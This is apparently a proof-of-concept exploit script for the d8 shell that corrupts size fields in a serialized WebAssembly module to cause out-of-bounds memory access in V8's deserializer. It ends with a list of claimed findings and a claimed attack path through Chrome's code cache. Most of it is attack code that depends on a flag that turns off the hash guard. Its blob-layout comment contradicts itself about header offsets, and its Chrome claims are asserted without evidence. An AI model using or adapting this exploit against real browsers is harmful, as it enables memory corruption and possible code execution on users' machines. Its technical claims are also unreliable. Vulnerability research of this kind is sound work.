// =============================================================================
// Wasm Serialization OOB PoC
// Target: V8 src/wasm/wasm-serialization.cc
// CWE-787: OOB Write via crafted code_size in NativeModuleDeserializer::ReadCode
// CWE-125: OOB Read via oversized code_size in reader->ReadVector<uint8_t>
//
// Run:  d8 --no-liftoff --wasm-poc-bypass wasm_serialization_poc.js
//
// Browser note: Chrome's HTTP cache path reaches NativeModuleDeserializer
//   with attacker-supplied bytes when cache bytes are injected at:
//   Chrome user data dir / Cache / (URL hash) side-data entry.
//   That path has NO hash check equivalent to d8's.
// =============================================================================

'use strict';

// --- helpers ---
function hex(n, w=8) { return '0x' + (n>>>0).toString(16).padStart(w,'0'); }
function u32le(arr, off) {
  return (arr[off]|0) | ((arr[off+1]|0)<<8) | ((arr[off+2]|0)<<16) | ((arr[off+3]>>>0)<<24);
}
function pu32le(arr, off, v) {
  v = v >>> 0;
  arr[off]   = v & 0xff;
  arr[off+1] = (v >> 8)  & 0xff;
  arr[off+2] = (v >> 16) & 0xff;
  arr[off+3] = (v >> 24) & 0xff;
}

// --- Minimal WASM module with one i32-returning function ---
// (i32.const 42)
const wireBytes = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,        // type: () -> i32
  0x03,0x02,0x01,0x00,                        // func: type[0]
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,        // export "f" = func[0]
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b,  // body: i32.const 42 end
]);

print('[*] Compiling module with TurboFan (--no-liftoff required)...');
const mod = new WebAssembly.Module(wireBytes);
const inst = new WebAssembly.Instance(mod);
print('[*] f() =', inst.exports.f());   // should be 42

// --- Serialize to get a valid blob ---
print('[*] Serializing...');
const serBuf = d8.wasm.serializeModule(mod);
const original = new Uint8Array(serBuf.slice(0));  // immutable reference copy
const crafted  = new Uint8Array(serBuf.slice(0));  // mutable working copy
print('[*] Serialized blob: ' + crafted.length + ' bytes');

// =============================================================================
// BLOB FORMAT (x64, little-endian):
//
//  [0  - 27]  Global header (28 bytes):
//               [0 ] kMagicNumber       (uint32)
//               [4 ] Version::Hash()    (uint32)
//               [8 ] CpuFeatures        (uint32)
//               [12] FlagList::Hash()   (uint32)
//               [16] features           (uint32, bit31 = trap-handler)
//               [20] CompileImportFlags (uint32)
//               [24] constants_module_len (uint32)
//               [28..28+len] constants_module bytes
//  [28 - 43]  NativeModule header (16 bytes):
//               [28] detected_features  (uint64)
//               [36] total_code_size    (uint64 = size_t)
//  [44 ...]   Per-function entries:
//    TurboFan: [+0 ] 0x04 marker (uint8)
//               [+1 ] constant_pool_offset  (int32)
//               [+5 ] safepoint_table_offset(int32)
//               [+9 ] handler_table_offset  (int32)
//               [+13] code_comment_offset   (int32)
//               [+17] jump_table_info_offset(int32)
//               [+21] unpadded_binary_size  (int32)
//               [+25] stack_slot_count      (int32)
//               [+29] ool_spill_count       (int32)
//               [+33] tagged_parameter_slots(uint32)
//               [+37] code_size             (uint32)  ← VULNERABILITY
//               [+41] reloc_size            (uint32)
//               [+45] source_position_size  (uint32)
//               [+49] inlining_position_size(uint32)
//               [+53] deopt_data_size       (uint32)
//               [+57] trapping_instructions_size (uint32)
//               [+61] effect_handlers_size  (uint32)
//               [+65] kind (WasmCode::Kind, int32)
//               [+69] tier (ExecutionTier,  int8)
//               [+70] code bytes [code_size]
//               ... reloc, source_pos, ...
//  [end-4]   Tiering budget (num_declared_functions × uint32)
// =============================================================================

// Find function-0 TurboFan header at offset 44
const FN0_OFF = 44;
if (crafted[FN0_OFF] !== 0x04) {
  print('[!] FAIL: Expected kTurboFanFunction(0x04) at offset', FN0_OFF,
        'got', hex(crafted[FN0_OFF], 2),
        '- run with --no-liftoff!');
  quit(1);
}

// code_size field is at FN0_OFF + 1 + 9*4 = 44 + 37 = 81
const CODE_SIZE_OFF = FN0_OFF + 1 + 9 * 4;  // = 81
const originalCodeSize = u32le(crafted, CODE_SIZE_OFF);
print('[*] Function-0 code_size at offset ' + CODE_SIZE_OFF + ' = ' + originalCodeSize + ' bytes');
print('[*] Original serialized bytes (first 90):');
print('   ', Array.from(crafted.slice(0,90)).map(x=>x.toString(16).padStart(2,'0')).join(' '));

// =============================================================================
// VULNERABILITY DEMONSTRATION
//
// CWE-787 / CWE-125: wasm-serialization.cc ReadCode() at line ~1023:
//
//   DCHECK_GE(remaining_code_size_, code_size);   // ← only DCHECK, not CHECK
//   if (current_code_space_.size() < (size_t)code_size) {
//     // Allocates code_space_size = min(90% of max, remaining_code_size_)
//     // remaining_code_size_ is NOT validated against the allocation header!
//   }
//   unit.src_code_buffer = reader->ReadVector<uint8_t>(code_size); // ← OOB read
//
// By overwriting code_size to a large value, we cause:
//   1. AllocateForDeserializedCode(code_space_size) where code_space_size
//      is clamped to min(max, remaining_code_size_). remaining_code_size_
//      is taken from NativeModule header total_code_size (offset 36, 8-byte).
//      We also need to inflate that.
//   2. reader->ReadVector<uint8_t>(code_size) reads code_size bytes from the
//      blob buffer—past the end if code_size > actual remaining bytes.
//   3. CopyAndRelocate() then copies the OOB data into the JIT allocation,
//      and processes reloc records against it.
// =============================================================================

// Craft malicious blob: inflate both total_code_size and code_size
const GIANT = 0x08000000;  // 128 MB — well outside blob bounds

// total_code_size is a uint64 at offset 36, we write low 32-bits only
// (high 32 stays 0 for values < 4GB)
const TOTAL_CODE_OFF = 36;
print('\n[*] CRAFTED PAYLOAD:');
print('    Inflating NativeModule.total_code_size at offset ' + TOTAL_CODE_OFF + ' → ' + hex(GIANT));
pu32le(crafted, TOTAL_CODE_OFF, GIANT);

print('    Inflating function-0 code_size at offset ' + CODE_SIZE_OFF + ' → ' + hex(GIANT));
pu32le(crafted, CODE_SIZE_OFF, GIANT);

print('\n[*] Crafted bytes at key offsets:');
print('    total_code_size [36..43]:', Array.from(crafted.slice(36,44)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
print('    code_size       [81..84]:', Array.from(crafted.slice(81,85)).map(x=>x.toString(16).padStart(2,'0')).join(' '));

// =============================================================================
// DESERIALIZATION — triggers NativeModuleDeserializer::ReadCode
// Requires: --wasm-poc-bypass (removes d8-specific hash guard)
// =============================================================================
print('\n[*] Attempting deserialization with crafted bytes...');
print('    (requires --wasm-poc-bypass to skip d8 hash guard)');
print('    In production Chrome, no equivalent guard exists on the HTTP cache path.');
print();

let result;
try {
  const craftedBuf = crafted.buffer;
  result = d8.wasm.deserializeModule(craftedBuf, wireBytes);
  print('[+] deserializeModule returned (unexpected success — module:', result, ')');
} catch(e) {
  print('[!] Exception:', e.message);
  if (e.message && e.message.includes('manipulated')) {
    print('    → Hash guard fired: run with --wasm-poc-bypass');
  } else {
    print('    → Deserialization failed as expected (OOB read triggered crash/exception)');
  }
}

print('\n=== FINDINGS SUMMARY ===');
print('File: src/wasm/wasm-serialization.cc');
print('');
print('Finding 1 (CWE-125 OOB Read / CWE-787 OOB Write):');
print('  NativeModuleDeserializer::ReadCode() ~line 1023');
print('  code_size=', hex(GIANT), '(attacker-controlled)');
print('  DCHECK_GE(remaining_code_size_, code_size) is DCHECK-only → silent in release');
print('  reader->ReadVector<uint8_t>(code_size) walks past blob end');
print('  CopyAndRelocate then processes attacker-controlled reloc stream');
print('  → JIT code space written from OOB blob data = code execution primitive');
print('');
print('Finding 2 (CWE-125 OOB Read):');
print('  Reader::ReadVector at line 1038 — no CHECK on code_size upper bound');
print('');
print('Finding 3 (CWE-129 External ref tag OOB):');
print('  address_from_tag(tag) at line 1140');
print('  tag is DCHECK_GT-only — walks past ExternalReferenceTable in release');
print('');
print('Finding 4 (CWE-129 Wild jump-table target):');
print('  GetNearCallTargetForFunction(tag) at line 1102');
print('  function index unchecked → arbitrary call-target write in jump table');
print('');
print('Finding 5 (CWE-125 code_pointer_handles OOB):');
print('  GetCodePointerHandle(index) at line 1128 — no upper-bound CHECK');
print('');
print('Finding 6 (CWE-125 canonical_sig_id OOB):');
print('  canonical_type_id(module_local_sig_id) at line 1122 — V8_ASSUME only');
print('');
print('Finding 7 (CWE-125 LEB parse OOB):');
print('  LEBHelper::read_u32v in effect-handler table at line 348');
print('  no end-of-buffer guard → walks past blob on malformed LEB');
print('');
print('Attack surface:');
print('  d8:     d8.wasm.deserializeModule (guarded by hash check → need --wasm-poc-bypass)');
print('  Chrome: HTTP code cache side-data (no hash check in browser process IPC)');
print('          Path: URLRequestJob → CodeCacheHost → NativeModuleDeserializer');
